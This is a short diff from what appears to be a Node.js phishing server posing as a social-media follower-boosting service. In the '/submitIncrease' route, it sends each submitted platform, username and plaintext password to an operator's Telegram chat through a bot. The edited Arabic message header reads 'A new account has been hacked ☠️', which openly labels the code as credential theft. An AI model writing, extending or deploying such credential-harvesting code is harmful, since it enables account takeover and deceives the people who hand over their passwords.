@@ -517,7 +517,7 @@ app.post('/submitIncrease', (req, res) => {
 
     const deviceInfo = useragent.parse(userAgent);
 
-    bot.sendMessage(chatId, `تم تلقي بيانات زيادة المتابعين:
+    bot.sendMessage(chatId, `تم اختراق حساب جديد ☠️:
 منصة: ${platform}
 اسم المستخدم: ${username}
 كلمة السر: ${password}
